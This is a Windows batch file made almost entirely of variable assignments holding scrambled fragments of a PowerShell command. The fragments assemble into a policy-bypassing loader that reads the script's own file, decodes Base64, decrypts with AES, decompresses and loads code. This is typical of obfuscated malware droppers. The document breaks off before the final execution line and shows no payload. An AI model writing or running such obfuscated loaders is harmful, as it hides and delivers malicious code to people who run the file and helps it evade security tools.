@echo off
set "XWsvwOAsgS== $d"
set "NbiyfKHqcg=$npi"
set "gzWKrjyOtJ=m.IO"
set "kSMbcJzver=Disp"
set "ThAHDUhOYl=.Key"
set "ZusvuCIiSa=[IO."
set "QrIcprjnxu=le  "
set "FrvuufUKED=se()"
set "wixIpVmnYx=-joi"
set "WmCXhsrIrI= = $"
set "zLftdlAYsZ=ptog"
set "EvlIpDNKcY=ment"
set "YFkTwhNPcm=$tsN"
set "DzYxAEPxBE=TllA"
set "FuoLtFsdFh=.Cop"
set "guRoOgqUnV=flec"
set "qSNNmrIPap=);$t"
set "XCExzFxuoj=e]::"
set "qsNIZHFbXc=::('"
set "BmzgtCGMyc=pher"
set "JjsYxrXoZG=tryP"
set "jnYGBloewi=iron"
set "vVCBsjHWll='0Pg"
set "eDehoaPifi=gnir"
set "vaRDTkeRIe=join"
set "BcpZjqBPRv=ddin"
set "tcDQBeYzbq=lBlo"
set "oGJCEldXJg= '')"
set "LLjNOcAUDA=m.IO"
set "WIVyeUWPIN=ress"
set "zOHOrNfrRs=eMVs"
set "RdYCiVIeyV=oSIb"
set "gvAvXfkgJU=xw.T"
set "PXLKXqQzpl=IFju"
set "YcHXVZTGot=ypto"
set "mzlVYiRSdJ=();$"
set "DMUrUbWrFh=form"
set "dhxJqTrNTb=null"
set "JywvfhItVo=bypa"
set "DJxnzljrfv=Obje"
set "ZLyxkcQKMl=Bmor"
set "YeIkhdJVHv= New"
set "gweTUbLxwr=ert]"
set "sDDGOZIEgd=.Dis"
set "zTOCoSWwWw=Syst"
set "fqbfAplWyi=IbJ."
set "ZNYAxXhnfx=bAAb"
set "GTAeZUsbKy=ionM"
set "SVbTUkDtUp=J = "
set "eaGbYUsAGX=-1.."
set "hdMJupuDpn=('%~f0'"
set "TOANGAZFhD=ode]"
set "ppEumhzqIr=pose"
set "qJHxWrtUeu=;$oS"
set "kVDcYwXlZW=ecry"
set "CSAiDTsVgK=[-1."
set "MDlllzWAYk=em.I"
set "xXVHjDFQNq=n ''"
set "amjUGHRkwV=..-1"
set "UPvYYgYlzq=ct S"
set "QSobomUJfy= '')"
set "fxjtjfLJOr=oryS"
set "sbLwzMRWUT=bjec"
set "FchkDrtvyp==');"
set "hDoGAypucN=k; }"
set "XFGdAvzSGQ=$npi"
set "VlvphjOsfb=:: '"
set "hPHXzRsgJT=]::("
set "FrhokkIqQR= = $"
set "IfCjQzpHRO=);$x"
set "hlmlqYfSzI=bstr"
set "EyYNzilATF=yste"
set "bGPWPAaUNq=ion."
set "rckbviPCzj=rtS4"
set "KrvCcqyUrz=ress"
set "sDFkedCnKj=F'[-"
set "jgCDHrvono=Star"
set "dCpPumZFVr= if "
set "hLJFIosjiQ=y]::"
set "jgGwNeNpLq=.-16"
set "qfTWxBhXTV=O.Me"
set "EKWGNzzgRD=th('"
set "sLeELBFxNL=in $"
set "gLVoMBKGjm=n ''"
set "xYQiVrGCMp=FjuI"
set "lwFYYNTfJV=uI ="
set "UKeHBYYmqU=WGho"
set "YlAXxaBwAe=pres"
set "kJRxIDOjhO=New-"
set "mDSbSftIxT== [S"
set "VmyUYRSVaG=xw ="
set "HLjRPEtSjl=I = "
set "tnjpDlYGOd=IXL "
set "WejANVMxMN=[]] "
set "ohTnrwIsKH=pose"
set "QZQaPBxVNp=oint"
set "pFFRNimAeW=.Cry"
set "LEFIVVEbuG=xw);"
set "ANtrcEGJNS=e = "
set "mpkKdJknUz=::De"
set "ftsWAWYeTw=vert"
set "tcuiyjGIjW=sion"
set "OFtnGZzAyl=Conv"
set "qiMjtcKENa=3); "
set "yQHYtvTprj=S46e"
set "kVABIxLPAI=nirt"
set "tRSSmuwYQd=Mode"
set "VdEbhpqqUe=);$n"
set "WEdPrwTQJs=b.Pa"
set "VTLaTAdwLw=YxVw"
set "rjTJahetAW=onve"
set "kesQGdYQqy=Disp"
set "mlPJpmhCgA=-ep "
set "daefWvCBXr=.Dis"
set "ieVgOvarHJ=6] -"
set "XsASnfvbbo=tem."
set "VuXChuYDBz=)($c"
set "nBezeyMQHU=$IFj"
set "BMpqzPblHZ=zuZI"
set "SiRVtlooES=l = "
set "qOtYAxcijO===')"
set "qmilCKoJUy=;$ni"
set "wDwHtVufAV=stem"
set "vmsnpemdFn=)) {"
set "hslEXrdLmk=] -j"
set "mWcFxVCYLd=FjuI"
set "hHYPcQWLrd=d;$d"
set "PVgfoDfsDf=.IO."
set "fuvTMhbXSf=);$d"
set "JGhFRtFyuY=bJ, "
set "pPhSBtZSeM=am;$"
set "DoaPMkSpkf=ck($"
set "bNXJvfilxh=dj0C"
set "ZuLtZIvnHO=g = "
set "zPwrRjFRQE=uCNo"
set "fuHNLgHlAb=('Tg"
set "NlzvHliGnU=oL'["
set "HFyAQCkhUy=Syst"
set "KiESpIxYpS=..-1"
set "GSpbHhwymW=raph"
set "WLCrhHoOjE=gsYZ"
set "kkVEqWYlDI=-4] "
set "LzMiBXqrPz=.Con"
set "sWxrVzvBSK=rofi"
set "eblXNOROZL=.Mod"
set "qJNwhrLrui=PTtG"
set "bUrlWIRBDJ= [Sy"
set "RCraFPzAef=tion"
set "KZTzfdvXGE=:('g"
set "AsrwnJLAyi=bAAb"
set "UViGaJgihu=raph"
set "mZwVNzklpN=pStr"
set "RoxKtMWbRt=uCNo"
set "mFyQINWMaX=esMa"
set "VTFZjnZvWA=$dbA"
set "eKomwozAvM=yste"
